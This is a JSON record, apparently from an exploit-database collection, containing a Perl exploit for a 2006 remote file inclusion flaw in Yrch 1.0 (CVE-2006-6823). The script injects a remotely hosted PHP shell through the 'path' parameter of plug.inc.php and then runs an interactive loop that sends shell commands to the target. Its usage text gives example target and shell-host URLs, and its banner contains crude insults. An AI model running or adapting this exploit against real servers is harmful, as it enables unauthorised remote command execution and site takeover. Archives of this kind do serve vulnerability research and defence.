{
  "id": "3025",
  "title": "Yrch 1.0 - &#039;plug.inc.phppath&#039; Remote File Inclusion",
  "cve": "CVE-2006-6823",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n##########################################################################################################\r\n#                                                                                                        #\r\n# Yrch! v1.0 Hierarchised Website Directories (plug.inc.php)Remote File Include Vulnerability            #\r\n#                                                                                                        # \r\n# Bug Found : DeltahackingTEAM discovery:Dr.Pantagon & Exploitet By Dr.Trojan contact Dr.Trojan[a]DeltaSecurity.ir   #\r\n#                                                                                                        #\r\n# Class:  Remote File Include Vulnerability                                                              #\r\n#                                                                                                        #\r\n# exemplary Exp: http://lashiyane.org/[path]/yrch/plugins/metasearch/plug.inc.php?path=[                 #\r\n#                                                                                                        #\r\n# Remote: Yes                                                                                            #\r\n#                                                                                                        #\r\n# Type:   Highly critical                                                                                #\r\n#                                                                                                        #\r\n# Vulnerable Code:include_once($path.\"metasearch.class.php\");                                            #\r\n#                                                                                                        #\r\n# Download:http://switch.dl.sourceforge.net/sourceforge/yrch/Yrch.v1.0.zip                               #\r\n#                                                                                                        #\r\n# Ptach : www.Advistory.deltasecurity.ir                                                                 #\r\n#                                                                                                        #\r\n# Bug Found : DeltahackingTEAM Exploitet Discovered &Exploitet: Dr.Trojan<Dr.Trojan[A]Deltasecurity.ir   #\r\n#                                                                                                        #\r\n# Exploit: Yrch!.pl                                                                                      #\r\n#                                                                                                        # \r\n# Web Site:www.deltasecurity.ir <0Ur Server(Secure=99/999)www.takserver.ir>                              # \r\n#                                                                                                        #                             \r\n#SP FUCK.............: z_zer0c00l(floozie Mother Test 100%=z_zer0c00l=misbegotten:D)                     #\r\n##########################################################################################################\r\n\r\nuse LWP::UserAgent;\r\nuse LWP::Simple;\r\n\r\n$target = @ARGV[0];\r\n$shellsite = @ARGV[1];\r\n$shellcmd = @ARGV[2];\r\n$file = \"plug.inc.php?path=\";\r\n\r\nif(!$target || !$shellsite)\r\n{\r\n    usage();\r\n}\r\n\r\nheader();\r\n\r\nprint \"Type 'exit' to quit\";\r\nprint \"[cmd]\\$\";\r\n$cmd = <STDIN>;\r\n\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n    $xpl = LWP::UserAgent->new() or die;\r\n        $req =\r\nHTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd)\r\nor die(\"\\n\\n Failed to connect.\");\r\n        $res = $xpl->request($req);\r\n        $r = $res->content;\r\n        $r =~ tr/[\\n]/[&#234;]/;\r\n\r\n    if (@ARGV[4] eq \"-r\")\r\n    {\r\n        print $r;\r\n    }\r\n    elsif (@ARGV[5] eq \"-p\")\r\n    {\r\n    # if not working change cmd variable to null and apply patch manually.\r\n    $cmd = \"echo if(basename(__FILE__) == basename(\\$_SERVER['PHP_SELF'])) die(); >> list_last.inc\";\r\n    print q\r\n    {\r\n\r\n    }\r\n    }\r\n    else\r\n    {\r\n    print \"[cmd]\\$\";\r\n    $cmd = <STDIN>;\r\n    }\r\n}\r\n\r\nsub header()\r\n{\r\n    print q\r\n    {\r\n#################################################################################\r\n                        Bug Found : DeltahackingTEAM\r\n               Yrch!.pl  - Remote File Include Exploit\r\n            Vulnerability discovered and exploitet by Dr.Trojan&Dr.Pantagon\r\n                          Dr.Trojan@Deltasecurity.ir\r\n                www.DeltaSecurity.ir &  www.Takserver.ir\r\n#################################################################################\r\n    };\r\n}\r\n\r\nsub usage()\r\n{\r\nheader();\r\n    print q\r\n    {\r\n########################################################################\r\nUsage:\r\nperl Yrch!.pl  <Target website> <Shell Location> <CMD Variable> <-r> <-p>\r\n<Target Website> - Path to target eg: www.lashiyane.org/yrch/plugins/metasearch\r\n<Shell Location> - Path to shell eg: d4wood.by.ru/cmd.gif\r\n<CMD Variable> - Shell command variable name eg: Pwd\r\n<r> - Show output from shell\r\n<p> - plug.inc.php\r\nExample:\r\nperl Yrch!.pl http://localhost/include http://localhost/s.txt cmd -r -p\r\n########################################################################\r\n    };\r\nexit();\r\n}\r\n\r\n# Farzad.SHarifi\r\n\r\n# milw0rm.com [2006-12-27]",
  "url": "https://www.exploit-db.com/exploits/3025"
}